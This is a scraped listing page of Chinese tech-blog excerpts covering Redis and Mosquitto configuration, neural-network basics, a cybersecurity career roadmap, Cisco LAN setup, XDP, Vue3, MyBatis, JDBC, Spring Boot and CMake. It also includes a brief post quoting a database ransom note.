		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 一、进入阿里云服务器管理页面，点击“网络与安全组”--&gt;“安全组配置”--&gt;“添加安全组规则”。二、配置Redis.conf三、服务器重启Redis，本地Redis客户端测试连接。 一、进入阿里云服务器管理页面，点击“网络与安全组”–&gt;“安全组配置”–&gt;“添加安全组规则”。 二、配置Redis.conf 1、默认只允许本地访问，注释掉允许其他访问
#bind 127.0.0.1 2、将保护模式改成no
protected-mode no 3、设置密码
requirepass + 密码 三、服务器重启Redis，本地Redis客户端测试连接。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6d8dae263e3a1d36cdb145bfc2bc8ab/" rel="bookmark">
			深度学习 | 全连接层你必须知道的20个知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 什么是全连接层?
答:全连接层是神经网络中的一种层,它将上一层的每一个节点与当前层的每一个节点相连接。
2. 全连接层有哪些参数?
答:全连接层的主要参数有权重矩阵W和偏置向量b。
3. 权重矩阵W的大小如何确定?
答:权重矩阵W的大小由上一层的节点数量和当前层的节点数量共同确定。如果上一层有n个节点,当前层有m个节点,则W大小为n*m。
4. 偏置向量b的大小是多少?
答:偏置向量b的大小与当前层节点数量相同,如果当前层有m个节点,则b的大小为m。
5. 全连接层的计算过程是什么?
答:全连接层的计算过程是:y=Wx+b。先计算权重矩阵W和输入x的乘积,再加上偏置b,得到输出y。
6. 激活函数在全连接层中的作用是什么?
答:激活函数对全连接层的输出y进行非线性映射,增强神经网络的拟合能力。常用的激活函数有ReLU、sigmoid等。
7. 全连接层有哪些优点?
答:全连接层计算简单,易于实现,参数直接具有实际物理意义,比较容易调试和分析。
8. 全连接层有哪些缺点?
答:全连接层的参数数量巨大,容易过拟合,计算复杂度高。
9. 如何缓解全连接层的过拟合问题?
答:可以采用dropout、权重衰减等方法来缓解全连接层的过拟合问题。
10. 全连接层在哪些网络结构中使用?
答:全连接层在多层感知机(MLP)、CNN最后的分类器、RNN的输出层等网络结构中广泛使用。
11. 卷积层和全连接层的主要区别是什么?
答:卷积层的参数共享,全连接层的每个节点都有自己的权重参数。卷积层通过滑动窗口对局部特征进行提取,全连接层可以建立输入和输出之间的全局映射关系。
12. 怎样决定全连接层的节点数量?
答:全连接层的节点数量可以根据任务的复杂度,上一层的节点数量,避免过拟合的考量等因素决定。一般而言,节点数量越多代表建模能力越强,但也更容易过拟合。
13. 怎样实现神经网络的多分类任务?
答:可以在神经网络的最后加入一个全连接层,节点数量设置为类别的数量,然后采用softmax激活函数将其转换为概率分布,表示每个类别的预测概率。
14. one-hot编码的输入如何通过全连接层计算?
答:对one-hot编码的输入,全连接层的权重矩阵W的行与输入元素的one-hot索引对应。那么计算过程就是选取输入对应的权重向量与权重矩阵的其余部分进行乘积,再加上偏置b。
15. 全连接层的初始化方法有哪些?
答:全连接层的参数可以采用随机Initialization、Xavier initialization等方法进行初始化。常用的随机初始化方法有均匀分布初始化、正态分布初始化等。
16. 权值衰减是什么?如何应用在全连接层?
答:权值衰减是一种正则化技术,可以缓解全连接层过拟合的问题。它通过在损失函数中添加权重向量的L2范数来惩罚过大的权重值,使得权重向量的范数不会变得过大。
17. 批标准化在全连接层中的作用是什么?
答:批标准化可以加速神经网络的训练,提高模型的泛化能力。在全连接层中使用批标准化可以对层的输入进行标准化,避免medy内层出现梯度消失或爆炸的问题。
18. 怎样减小全连接层的参数数量?
答:可以使用参数约束技术如低秩分解将大的权重矩阵分解为两个小矩阵的乘积,来减小参数数量。也可以采用深度神经网络,使用多个小规模的全连接层替代一个大规模的全连接层。
19. 如何实现全连接层的可解释性?
答:可以通过计算输入对输出的敏感度、网络层激活值分布来实现全连接层的可解释性。也可以采用可视化的方式直观地展示全连接层中权重的参数分布情况与输入到输出的映射过程。
20. 全连接层的稀疏性如何定义?如何产生稀疏的全连接层?
答:全连接层的稀疏性定义为非零权重参数所占比例。可以通过L1正则化引入权重的绝对值惩罚项,使得许多权重值衰减为0,实现稀疏的全连接层。也可以直接在训练过程中将某些权重值设置为0,得到一个稀疏的权重矩阵。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d7b2546598e6a3451e4c21ccce326eb/" rel="bookmark">
			2023年网络安全有哪些岗位？月薪7K到30K
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络安全有哪些岗位？ 1. 安全服务工程师 7-10
网络安全工程师、安全项目经理：主要负责甲方设备安全调试工作。需精通服务器、网络技术以及安全设备原理与配置。
2. 安全运维工程师 7-10
安全运维工程师，主要对己方安全防御体系的运维和应急响应工作。能够熟练配置安全设备，具有极强日志分析能力。需精通渗透技术、安全设备原理，知识面要求广，实战能力强。
常见安全设备：防火墙、入侵防御系统（ips）、入侵检测系统（ids）、态势感知、蜜罐、流量分析平台等
3. 代码安全审计 12+
对网站代码进行审计，发现其中可能存在的漏洞；漏洞修补方案制定，对发现的漏洞制定修补方案；
4. 安全售前工程师
安全售前工程师：主要负责与购买方沟通接洽，根据己方产品，设计技术方案，满足甲方安全需求。需精通服务器，网络技术，安全设备，攻防技术，并对安全趋势跟踪紧密，表达能力和文档能力。
5. web安全工程师
Web安全工程师：主要负责自身网站安全服务工作，从代码层及业务逻辑层面为开发提供安全建议。需对web安全原理有深入理解，并熟悉公司业务流程。
6. 渗透测试工程师
渗透测试工程师：主要负责渗透测试工作。在授权模式下，通过各种攻击技术渗透甲方真实网络与服务器环境，提供渗透测试报告及修复建议。需精通攻击渗透技术（系统、web、数据库…）与防御技术。
7. 等保测评工程师
等保测评的项目实施及管理包括等保测评的物理安全测评、主机安全测评、数据安全测评、应用安全测评、安全管理的测评。
8. 网络安全研究员——内网 30k
网络安全发展路线 下面给大家总结了一套适用于网安零基础的学习路线，应届生和转行人员都适用，学完保底6k！就算你底子差，如果能趁着网安良好的发展势头不断学习，日后跳槽大厂、拿到百万年薪也不是不可能！
【点击这里，先领资料再阅读哦~】
初级网工 1、网络安全理论知识（2天） ①了解行业相关背景，前景，确定发展方向。
②学习网络安全相关法律法规。
③网络安全运营的概念。
④等保简介、等保规定、流程和规范。（非常重要）
2、渗透测试基础（一周） ①渗透测试的流程、分类、标准
②信息收集技术：主动/被动信息搜集、Nmap工具、Google Hacking
③漏洞扫描、漏洞利用、原理，利用方法、工具（MSF）、绕过IDS和反病毒侦察
④主机攻防演练：MS17-010、MS08-067、MS10-046、MS12-20等
3、操作系统基础（一周） ①Windows系统常见功能和命令
②Kali Linux系统常见功能和命令
③操作系统安全（系统入侵排查/系统加固基础）
4、计算机网络基础（一周） ①计算机网络基础、协议和架构
②网络通信原理、OSI模型、数据转发流程
③常见协议解析（HTTP、TCP/IP、ARP等）
④网络攻击技术与网络安全防御技术
⑤Web漏洞原理与防御：主动/被动攻击、DDOS攻击、CVE漏洞复现
5、数据库基础操作（2天） ①数据库基础
②SQL语言基础
③数据库安全加固
6、Web渗透（1周） ①HTML、CSS和JavaScript简介
②OWASP Top10
③Web漏洞扫描工具
④Web渗透工具：Nmap、BurpSuite、SQLMap、其他（菜刀、漏扫等）
恭喜你，如果学到这里，你基本可以从事一份网络安全相关的工作，比如渗透测试、Web 渗透、安全服务、安全分析等岗位；如果等保模块学的好，还可以从事等保工程师。薪资区间6k-15k
到此为止，大概1个月的时间。你已经成为了一名“脚本小子”。那么你还想往下探索吗？
【“脚本小子”成长进阶资源领取】
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d7b2546598e6a3451e4c21ccce326eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da46190fdbc12c16e659e38a450d604a/" rel="bookmark">
			利用Cisco软件模拟校园局域网搭建及连入互联网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、搭建拓扑结构
二、完成内网搭建
1.完成机房区域组建（vlan划分，主干链路的设置）
2.完成服务器区域组建（vlan划分、固定IP地址）
3.汇聚层设置（三层交换机），实现学校内网互联（主干链路设置、svi接口设置）
4.设置DHCP服务器和学校内部网站，实现校园网联通（自动分配ip地址）
5.实现校园网组网的完成（目标：能够ping通路由器的lan口）
6.对学校网站服务器进行设置
三、实现内外网互联
四、完成外网搭建
注：本文成品在本人下载中提供，软件版本为6.2版本。若版本不一致，可重新获取DHCP地址进行排错，但不一定保证能行。链接：利用Cisco软件模拟校园局域网搭建及连入互联网_在校园里搭建一个局域网资源-CSDN文库
一、搭建拓扑结构 拓扑结构及接口设计如下（搭建时建议将IP地址设置完成，如不特殊说明，子网掩码均为255.255.255.0，网关为交换机连接路由器那根线上显示的IP地址，特殊说明时，IP地址/24的24代表子网掩码中1的个数或者根据自己需要动态调整IP地址）
其中，NAT服务器以左为内网，以右为外网部分服务器。
二、完成校园网搭建 1.完成机房区域组建 点击Switch0，进入CLI，对Switch0做出如下更改：（switch1代码一致，不再赘述） Switch&gt;en Switch#conf Configuring from terminal, memory, or network [terminal]? Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#hostname Switch0 Switch0(config)#vlan 33 Switch0(config-vlan)#vlan 37 Switch0(config-vlan)#int range fa0/1-10 Switch0(config-if-range)#switchport access vlan 37 //将fa0/1-10划分给vlan37 Switch0(config-if-range)#int range fa0/11-20 Switch0(config-if-range)#switchport access vlan 33 //将fa0/11-20划分给vlan33 Switch0(config-if-range)#exit Switch0(config)#int fa0/24 Switch0(config-if)#switchport mode trunk Switch0(config-if)# %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to down %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/24, changed state to up end Switch0# %SYS-5-CONFIG_I: Configured from console by console 划分完的vlan可用show vlan命令查看
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da46190fdbc12c16e659e38a450d604a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb6655385db41f2b82a38f46c1a7fa00/" rel="bookmark">
			《Python之禅》让我们的python代码更加优美
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前在另外一篇文章中有总结过一部分关于python命名的规范，也帮助到了一些小伙伴，今天这篇文章主要是分享下《Python之禅》
历史文章跳转：python常用命名规范_python命名规范_花生君的博客-CSDN博客
查看《The Zen of Python》方法：
解释器中 import this
直接运行后，控制台输出英文版《The Zen of Python》
英文原版：
The Zen of Python, by Tim Peters
Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren't special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb6655385db41f2b82a38f46c1a7fa00/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3651330cd3fc2b723a6a01652036e9f8/" rel="bookmark">
			Echarts 地图 三级联动 钻省市区
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先来看看效果：
废话不多说，上代码吧
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt; &lt;!-- 这一步必须加，否则会出现请求阿里地图出现403，因为阿里做了访问限制 --&gt; &lt;meta name="referrer" content="no-referrer" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; * { margin: 0; padding: 0; } #main { margin: 50px auto; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="main" style="width: 1100px; height: 630px"&gt;&lt;/div&gt; &lt;/body&gt; &lt;script src="./js/axios.min.js"&gt;&lt;/script&gt; &lt;script src="./js/echarts.min.js"&gt;&lt;/script&gt; &lt;script&gt; // 基于准备好的dom，初始化echarts实例 var myChart = echarts.init(document.getElementById("main")); // 存储实例 let option = null; // 存储省级区域 let sheng = null; // 存储市区 let shi = null; // 存储区 let qu = null; // 存储点击的是否是县 0=省 1=市 2=区 let type = 0; // 获取中国地图 axios .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3651330cd3fc2b723a6a01652036e9f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58047d83400947dddb091cd14ecdf241/" rel="bookmark">
			使用python ldap3对接微软AD
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python使用ldap3操作微软AD 部署Active Direct Certificate Services客户端的配置方式Windows 证书配置 python使用ldap3操作AD示例 网上很多文档都是割裂的，此次使用python操作微软ad踩了不少坑，借助ChatGPT也没有用，记录一下正确信息。 环境信息: Windows Server 2019 Active Directory Domain Services DNS Server 以上环境需要提前安装完成，具体信息可以参考对应服务部署教程 部署Active Direct Certificate Services 为了避免重复造轮子，这一部分内容可以直接参考以下链接
http://cn-sec.com/archives/482172.html
部署完成后，使用连接中的ldp.exe尝试使用ssl去链接ad,如果成功则可以继续往下，不成功就先排查证书服务的问题。
客户端的配置方式 鉴于目前我的程序是跑在Windows 11的环境里面，这部分先讲Windows的部分，后期放到Linux里面跑服务的时候，再更新对应的方式。
Windows 证书配置 win+R在运行的窗口输入mmc并回车打开一个console根控制台打开如图所示
3.在弹出的窗口选择证书
4.选择管理哪个账号证书的窗口，需要选择服务账户，如图
5.在服务账户选择窗口请选择AD账户
完成之后在控制台会出现一个域控制器的证书管理列表，选择在搭建ADCS时的证书，如图所示 右击导出证书，导出证书时一定要分两次，一次导出的时候需要带私钥，第二次导出的时候不需要带私钥。
他们分别为带私钥的pfx格式和不带私钥的cer格式
6.把两个证书复制到已经加入到域的Windows客户端中
7.cer文件安装到本地计算机中，存储位置选择本地计算机，证书存储在个人区域，如图
8.pfx文件也需要安装到本地计算机中，存储区域选择为受信任的根证书颁发机构
9.两个证书安装成功后，点击cer证书应该是不会报错的，如下
图
如果证书不是这个状态，则证书有问题，就不能使用ldaps方式操作AD会出现证书相关的错误。
python使用ldap3操作AD示例 import ssl from ldap3 import Server, Connection,SASL, ALL,NTLM,MODIFY_REPLACE,HASHED_SALTED_SHA,HASHED_SALTED_SHA256,Tls from ldap3.utils.hashed import hashed SERVER = xxx.xxx.cn USER = 'xxx.xxx.cn\\user' PASSWORD = 'password' BASE_DC = 'dc=xxx.xxx.cn,dc=cn' def connection(): # ldaps connection settings(This link methmod allows for password modification) server = Server(SERVER,port=636,use_ssl=True,get_info=ALL,tls=Tls(validate=ssl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58047d83400947dddb091cd14ecdf241/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb0dd2ca2fd207a9e3deb72f6e07e15f/" rel="bookmark">
			vue3父子组件传值和双向数据绑定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		父 &lt;apple :username="username" @closez="close" v-model:key="key"&gt;&lt;/apple&gt; let username =ref('张三') const key = ref('123456') const close = (e)=&gt;{ console.log("子传递",e); } 子 &lt;template&gt; &lt;input v-model="username"/&gt; &lt;button @click="handleData"&gt;发送数据&lt;/button&gt; &lt;/template&gt; &lt;script lang="ts" setup&gt; import { ref} from "vue"; import { string } from "vue-types"; let username = ref('') let pwd = ref('') const props = defineProps({ username:{ type:string, default:'' } }) const emit = defineEmits(['closez','update:key']) const handleData = ()=&gt;{ pwd.value = "123456"; emit('closez',pwd.value) emit('update:key','14') } console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb0dd2ca2fd207a9e3deb72f6e07e15f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab4e36cde0fa3c1633653a4872eee82c/" rel="bookmark">
			交互设计师
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		交互设计师是负责设计用户与产品或系统之间的交互过程和界面的专业人员。他们的工作重点是改善用户体验，使用户能够轻松、高效地与产品进行交互，并达到预期的目标。
交互设计师的职责包括：
1. 用户研究和需求分析：了解目标用户的需求、行为和偏好，通过用户研究、竞争分析和用户调研等方法收集数据，为产品设计提供依据。
2. 信息架构设计：负责组织和结构化信息，创建易于理解和导航的信息架构，确保用户能够快速找到所需的信息。
3. 用户界面设计：设计用户界面元素，如菜单、按钮、表单等，确保其可用性、易用性和一致性。
4. 交互流程设计：设计用户与产品的交互流程，包括页面导航、功能操作和任务流程等，以确保用户能够无缝地完成任务。
5. 交互原型制作：使用工具如Sketch、Axure、Adobe XD等创建交互原型，用于展示和验证交互设计的想法和概念。
6. 用户测试和迭代：与用户进行测试和反馈收集，分析用户反馈，不断改进和优化交互设计，确保产品符合用户需求。
7. 与开发团队的协作：与开发人员、视觉设计师和产品经理等其他团队成员紧密合作，确保交互设计能够有效地实现和落地。
交互设计师需要具备以下技能和素质：
- 扎实的用户体验理论知识和方法论。
- 熟悉常用的设计工具和软件。
- 良好的沟通和协作能力，能够与团队成员和利益相关者进行有效的合作。
- 分析和解决问题的能力，能够理解和解决用户在交互过程中可能遇到的问题。
- 注意细节，追求用户体验的细致和完善。
- 良好的时间管理和项目管理能力，能够按时交付设计成果。
总而言之，交互设计师在产品开发过程中起着至关重要的作用，他们致力于创造用户友好的交互体验，提高产品的易用性和用户满意度。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0453a01f6f8db53564be36d98b254722/" rel="bookmark">
			XDP入门--eBPF之hello world
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文目录 1、下面这二张图，能非常好的说明XDP在Linux内核里的网络数据处理架构上的位置。2、XDP提供了可编程的灵活处理方式，XDP 程序可以通过 XDP action code来指定驱动程序对报文的后续处理方式：3、一个将收到的报文在XDP里直接丢弃的例子3.1、安装clang3.2、编写XDP程序3.3、设置编译环境并编译XDP程度3.4、加载XDP程序和验证3.5、卸载XDP程序 通过前文XDP, traffic control/tc/qdisc和netfilter在Linux的网络架构(packet flow in Netfilter and General Network)我们已经知道，XDP(eXpress Data Path)是与DPDK对应的一套快速数据处理框架，它是 Linux Kernel 中提供高性能、可编程的网络数据包处理框架。 它使得 Kernel 能够在数据报文到达 L2（网卡驱动层）时就对其进行针对性的高速处理，而无需再 “循规蹈矩” 地进入到 Linux内核的TCP/IP协议栈进行处理。
1、下面这二张图，能非常好的说明XDP在Linux内核里的网络数据处理架构上的位置。 2、XDP提供了可编程的灵活处理方式，XDP 程序可以通过 XDP action code来指定驱动程序对报文的后续处理方式： XDP_ABORTED：
丢弃报文，与 XDP_DROP不同之处在于XDP_ABORTED会用 trace_xdp_exception 来记录错误行为。XDP_DROP：
在网卡驱动层直接将报文丢弃，数据包将不再送到内核TCP/IP协议栈进行处理。XDP_PASS
报文继续送往内核TCP/IP协议栈进行处理，此时的处理方式与传统方式一致。XDP_TX：
将报文从接收到此报文的同一块网卡发送出去XDP_REDIRECT：
将报文重定向到其他的网卡或CPU，结合AF_XDP可以将报文直接送往用户空间，接应用程度直接接管报文，类似DPDK。 3、一个将收到的报文在XDP里直接丢弃的例子 本例子在树莓派系统上验证通过。
3.1、安装clang sudo apt install clang 3.2、编写XDP程序 每二个报文就丢弃一个报文，剩下的那个报文上送内核协议栈处理。
// file: xdp-helloworld.c #include &lt;linux/bpf.h&gt; #ifndef __section # define __section(NAME) \ __attribute__((section(NAME), used)) #endif __section("prog") int xdp_drop(struct xdp_md *ctx) { static int example_count = 1; example_count++; if (example_count%2) { return XDP_DROP; } else { return XDP_PASS; } } char __license[] __section("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0453a01f6f8db53564be36d98b254722/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e6b7f6c083c12895649e4807abe7ebb/" rel="bookmark">
			Mybatis批量插入并返回主键id的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 void insertGroupChartPart(@Param("partList") List&lt;ChartGroupPart&gt; partList, @Param("groupId") Integer groupId); &lt;insert id="insertGroupChartPart" useGeneratedKeys="true" keyProperty="partList.id"&gt; insert into group_chart_part (group_chart_id, part_id, host) value &lt;foreach collection="partList" item="item" separator=","&gt; ( #{groupId}, #{item.partId}, #{item.host} ) &lt;/foreach&gt; &lt;/insert&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3d6c2f498e3de552c9faa20161442d3/" rel="bookmark">
			Mosquitto部署（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、拉取镜像
二、配置
1、创建目录
2、配置文件：mosquitto.conf
3、配置文件：pwfile.conf
4、配置文件：aclfile.conf
5、启动容器
6、添加用户并授权
7、注意事项
三、mosquitto语法
四、验证
1、用户验证
2、匿名验证
3、注意
一、拉取镜像 docker pull eclipse-mosquitto:2.0.15-openssl 二、配置 1、创建目录 # 配置文件目录 mkdir -p /mosquitto/config # 持久化数据目录 mkdir -p /mosquitto/data # 日志目录 mkdir -p /mosquitto/log # 注意事项 文件夹授权 chmod -R 755 /mosquitto 2、配置文件：mosquitto.conf # 修改配置文件 # vi /mosquitto/config/mosquitto.conf # 开启持久化 persistence true # 持久化目录 persistence_location /mosquitto/data # 日志输出文件 log_dest file /mosquitto/log/mosquitto.log # 监听端口 listener 1883 # 允许匿名访问 allow_anonymous true # 认证账号密码存储配置文件 password_file /mosquitto/config/pwfile.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3d6c2f498e3de552c9faa20161442d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94b22d9ee86e80633a91a23f7571acf4/" rel="bookmark">
			关于数据库被黑客入侵的这件事情
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		您的数据库已删除。您必须支付 0.0245 比特币 (BTC) 才能取回它们。我拥有的备份：XXXXXXXXX。通过 xx(邮箱) 与我联系 只有与付款相关的邮件才会得到答复！
这真是悲催的分享，没办法数据恢复。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87311b26682e934535303b0b821d584d/" rel="bookmark">
			JDBC学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 JDBC概念与理解 JDBC：Java DataBase Connectivity (Java连接数据库技术)。
就是在Java代码中，使用JDBC提供的方法，可以发送字符串类型的SQL语句到数据库管理软件(MySQL Oracle DB2等)，并且获得语句执行结果。进而实现数据库的CRUD操作。
JDBC规范和接口
java语言只提供规范(接口)，规定数据库操作方法。标准Java类库在Java.sql，javax.sql 第三方数据库厂商
各个厂商根据java的jdbc规范，完成具体的代码，实现代码可以不同！但是方法都相同！
二 总结与优势 总结：① JDBC是Java连接数据库技术的统称
②JDBC是由两部分组成：Java提供的JDBC规范(接口)
各个数据库厂商的实现驱动jar包。
JDBC是一种典型的面向接口编程，使用了多态机制，可以降低耦合度。
优势：只需要学习JDBC接口规范方法，即可操作所有数据库软件。
在项目中需要切换数据库，只需要更新第三方驱动jar包即可，不用修改代码。实现无感操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee42a51ffd8d19f94ba8665f55c3b4a8/" rel="bookmark">
			项目实战07——SSM转SpringBoot
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习目标：
SpringBoot框架搭建无缝转移项目利用SpringBoot特性做修改 迁移pom文件
在pom文件中先删除SpringMVC、junit 、mybatis，然后迁移到springboot项目中。
迁移dao文件
将src/main/resources文件下的jdbc.properties迁移到springboot的application.properties文件，再将logback.xml、mybatis-config.xml以及水印图片watermark.jpg都移动到springboot的resources文件下。
springboot讲究去xml化，所以很多xml配置文件我们就不迁移到springboot中，而是用代码来代替他的功能，将它写成类的配置。首先在MVC项目中的resources/spring下的spring-dao.xml文件中，我们配置了datasources、SqlSessionFactory等启动一个bean，但是扫描dao接口包呢在springboot中会启动全package扫描，所以不用配置。然后我们在springboot中创建com/imooc/o2o/config/dao的DataSourceConfiguration.java:
/** * 配置datasource到ioc容器里面 * */ @Configuration // 配置mybatis mapper的扫描路径 @MapperScan("com.imooc.o2o.dao") public class DataSourceConfiguration { @Value("${jdbc.driver}") private String jdbcDriver; @Value("${jdbc.url}") private String jdbcUrl; @Value("${jdbc.username}") private String jdbcUsername; @Value("${jdbc.password}") private String jdbcPassword; /** * 生成与spring-dao.xml对应的bean dataSource * * @return * @throws PropertyVetoException */ @Bean(name = "dataSource") public ComboPooledDataSource createDataSource() throws PropertyVetoException { // 生成datasource实例 ComboPooledDataSource dataSource = new ComboPooledDataSource(); // 跟配置文件一样设置以下信息 // 驱动 dataSource.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee42a51ffd8d19f94ba8665f55c3b4a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba840f581e2ddce039c4e93a2c291f34/" rel="bookmark">
			Ubuntu 更新 CMake 版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目中有时候会出现CMake版本小于最低要求的情况,实际上没有有必要这么高的要求,但是在不能改对方代码的情况下,只能去升级自身的版本了. 尝试了网上说的直接update之后再次安装的方式,结果版本号没有改变
sudo apt-get update
sudo apt-get remove cmake
sudo apt-get install cmake
cmake --version
所以只能试试网上的源码安装的方式, 结果成功了.
访问官网 Download | CMake
我下载的版本是
之后放到Home下面的Document目录来解压,右键就行了,不用tar的命令了
当然也可以使用tar来进行解压
tar -xzf ***.tar.gz [-C .] ## 这个不用显示各个文件，去掉v这个参数, 没有 -C 就解压到本目录
tar -xzvf ***.tar.gz [-C .]
中间出现了2个报错, 是因为少安装了g++和OpenSSL.
sudo apt-get install g++
sudo apt-get install libssl-dev 为了避免错误,可以体检安装, 之后执行的./configure 就成功了
之后再make就成功了,时间有点久.
最后运行 sudo make install 就可以了
最终可以看到, cmake的版本已经更新成了最新的3.27.
总结起来就是:
./configure
make
sudo make install
cmake --version
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/912fc0094bd9c88278c152c1204396b3/" rel="bookmark">
			『2023北京智源大会』视觉与多模态大模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		『2023北京智源大会』视觉与多模态大模型 文章目录 一. Drag Your GAN: Interactive Point-based Manipulation on the Generative Image Manifold | 潘新钢 | 南洋理工大学1. Image Manipulation(图像编辑)背景2. Drag Your GAN 二. Machine Learning for 3D Content Creation | 高俊 | NVIDIA 研究科学家1. 整个背景介绍2. 通用 3D 生成Pipeine3. 我们的工作4. 总结与展望 三. 通用视觉模型初探 | 王鑫龙 | 智源研究院研究员四. Image, Video, and 3D Content Creation with Diffusion Models | Huan Ling | NVIDIA 研究科学家参考文章 一. Drag Your GAN: Interactive Point-based Manipulation on the Generative Image Manifold | 潘新钢 | 南洋理工大学 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/912fc0094bd9c88278c152c1204396b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f655b2a01717e5c09aa9a899baf8cec/" rel="bookmark">
			Linux 查看进程ps命令详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 ps 命令是 Linux 系统中常用的进程查看工具，它可以查看当前系统中正在运行的进程信息。ps 命令可以显示进程的 ID、状态、执行命令、占用内存等信息，对于系统管理员来说，使用 ps 命令可以方便地监控和管理系统中的进程。
ps 命令语法及选项 ps 命令的基本语法如下：
ps [选项] 常用的选项包括：
选项说明-a显示所有进程，包括其他用户的进程-u显示进程的详细信息-x显示没有控制终端的进程-e显示系统中所有的进程-f显示进程的完整格式，包括进程的命令行参数-l显示进程的详细信息，包括进程的状态、资源占用等-h隐藏标题行 举例说明 1. 查看当前用户的所有进程 使用 ps 命令可以查看当前用户的所有进程，命令如下：
ps 该命令会显示当前用户的所有进程信息，如下所示：
PID TTY TIME CMD 302 tty7 00:10:29 Xorg 4372 tty1 00:00:01 bash 4603 pts/0 00:00:00 ps 在输出结果中，第一列是进程的 ID (PID)，第二列是进程所在的控制终端 (TTY)，第三列是进程运行的时间 (TIME)，第四列是进程的命令 (CMD)。
2. 显示所有进程 使用 ps -A 或 ps -e 命令可以显示系统中所有进程信息，包括其他用户的进程。两个命令的效果是相同的，执行结果如下：
PID TTY TIME CMD 1 ? 00:00:06 systemd 2 ? 00:00:00 kthreadd 3 ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f655b2a01717e5c09aa9a899baf8cec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9aa4008d0482b40ed390fcca31d66a29/" rel="bookmark">
			ROS2humble使用python3-serial库实现接收话题数据并采用16进制发送到串口
			</a>
		</h2>
		
